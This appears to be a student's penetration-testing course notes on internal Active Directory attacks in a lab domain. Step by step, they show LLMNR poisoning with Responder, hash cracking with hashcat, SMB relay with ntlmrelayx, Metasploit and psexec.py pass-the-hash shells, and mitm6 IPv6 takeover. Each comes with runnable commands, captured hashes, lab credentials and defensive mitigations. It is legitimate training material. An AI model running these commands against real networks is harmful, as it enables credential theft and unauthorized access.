## LLMNR Poisoning Overview

- used to identify hosts when DNS fails to do so.
- response includes a username and password hash.
- run responder early in the morning or after lunch. When an event occurs, we get usernames and dem hashes. We can crak these hashes with hashcat.

## Capturing Hashes with Responder

- on kali, run your listener with `responder -I eth0 -w -d -v`
- on fcastle machine, open explorer and try to connect to your kali ip: `//your-kali-ip`
- it should be intercepted:

```
[SMB] NTLMv2-SSP Username : MARVEL\fcastle
[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:2609515b2bb25e5a:F76239F7204A69D49A77B4EF98D6357C:01010000000000000066564B52E2DA01576913D4783F58F60000000002000800370050005000510001001E00570049004E002D004E0037004E004C004A0034003100300048005300520004003400570049004E002D004E0037004E004C004A003400310030004800530052002E0037005000500051002E004C004F00430041004C000300140037005000500051002E004C004F00430041004C000500140037005000500051002E004C004F00430041004C00070008000066564B52E2DA0106000400020000000800300030000000000000000000000000200000535A1B52C70E295C65366BFC5AF851D34870F09AF82762BEA1B979D4D996ED2B0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390032002E003100320038000000000000000000
```

## Cracking Our Captured Hashes

- copy the hash and save it to a file with `gedit ntlmhash.txt`
- `hashcat --help` to know the code for the hash algorithms, or `hashcat --help | grep NTLM`:

```
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```

- wordlists: https://github.com/danielmiessler/SecLists (rockyou is sufficient for ctf challenges)
- run `hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force`

```
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

- better to run it directly on your machine. https://hashcat.net/hashcat/

## LLMNR Poisoning Mitigation

- disable LLMNR/NBT-NS.
- if it's not possible, require network access control and require strong user passwords (>14 characters and limit common word usage).

## SMB Relay Attacks Overview

- relay the hashes to potentially gain access
- SMB signing must be disabled on the target. Relayed user credentials must be admin on machine.
- we need to disable response on responder. When we relay, we'll have access to the SAM hashes.

## SMB Relay Attacks Lab

- on your user machines, make sure you enable network discovery. Explorer > Network > click to enable network discovery.
- on your kali machine, run `nmap --script=smb2-security-mode.nse -p445 192.168.92.141 -Pn`

```
Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

We can't relay against the domain controller, but we can against the two user machines:

```
Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

You can do `nmap --script=smb2-security-mode.nse -p445 192.168.92.0/24` to scan the whole range.

- create a file with the two user machine ips : `nano targets.txt`.
- edit the responder config: `sudo mousepad /etc/responder/Responder.conf`. Switch off SMB and HTTP. Save and exit.
- run `responder -I eth0 -w -d -v`
- open a new terminal tab, run `ntlmrelayx.py -tf targets.txt -smb2support`
- try to connect to your kali ip from explorer on a user machine: `\\your-kali-ip-address`

You should get the SAM hashes:

```
[*] Authenticating against smb://192.168.92.143 as MARVEL\fcastle SUCCEED
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[-] 'CurrentState'

```

- run `ntlmrelayx.py -tf targets.txt -smb2support -i` to get an interactive shell:

```
Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

- open a new terminal tab, run `nc 127.0.0.1 11000`, then `help` to get all the available commands. `shares` to see available shared folders, then `use C$` and `ls`.
- we can also execute commands directly: `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`

## SMB Relay Attack Defenses

- enabling SMB signing on all devices.
- disabling NTLM auth on network (note that Windows defaults back to it when Kerberos stops works)
- account tiering: limits domain admins to specific tasks. User account for user machine, specific account when connection as domain admin. Difficult for admins to have 2 accounts.
- local admin restriction: can prevent a lot of lateral movement. But can increase the amount of service desk tickets (users will need to fill in tickets when they want a software installed).

## Gaining Shell Access

### Metasploit

#### With password

- run `msfconsole`, then `use exploit/windows/smb/psexec`, with a password or a hash (noisy).
- `set payload windows/x64/meterpreter/reverse_tcp`
- we want to attack fcastle: `set rhosts 192.168.92.142`
- `set smbdomain MARVEL.local`
- `set smbuser fcastle`
- `set smbpass Password1`
- you can do `show targets` if automatic is not working
- run `exploit`
- use `background` to keep a session, switch between sessions with `sessions` and `sessions 1` for example

#### Alternative with hash

- `set smbuser administrator` -`unset smbdomain`
- `set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`
- run `exploit`

### Psexec.py

- `psexec.py MARVEL/fcastle:'Password1'@192.168.92.142`, with a password or a hash (less noisy).
- `psexec.py administrator@192.168.92.142 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`

If it is not working, you can use `wmiexec.py` or `smbexec.py` instead.

## IPv6 Attacks Overview

- much more reliable than responder and relay attacks. Often, ipv4 is used, so nobody is taking care of the dns for ipv6. LDAP relaying.

## IPv6 DNS Takeover via mitm6

- do not run this more than 10 minutes, it can bring the network down.
- on your kali machine, open the relay listener, with the domain controller IP: `ntlmrelayx.py -6 -t ldaps://192.168.92.141 -wh fakewpad.marvel.local -l lootme`
- in another tab, start `mitm6 -d marvel.local`
- restart fcastle machine.
- on your kali machine, you should get a folder called `lootme` with domain computers, groups, and users.
- when someone logs in, a new user is created for us.

## IPv6 Attack Defenses

- disabling ipv6 is not ideal.
- block the following settings: dynamic host config protocol for ipv6, router advertisement, dynamic host config protocol for ipv6.
- disable WPAD if you don't use it internally.
- enable LDAP signing and LDAP channel binding.
- consider admin users as sensitive accounts that cannot be delegated or move them to the protected users group.

## Passback Attacks

- useful when you're stuck.
- printers: https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
- we look for a way to connect to ldap. We can change the LDAP server address by our IP address and listen for connections to capture credentials.

## Initial Internal Attack Strategy

- begin day with mitm6 or responder
- run scans to generate traffic (nessus)
- if scans are taking too long, look for websites in scope (http_version on metasploit) - always be multitasking!
- look for default credentials on web logins: printers, jenkins, etc.
- think outside the box. If nothing works after a few days, ask your client for some credentials created for us, so you can make sure you did your due diligence. Enumeration is key.
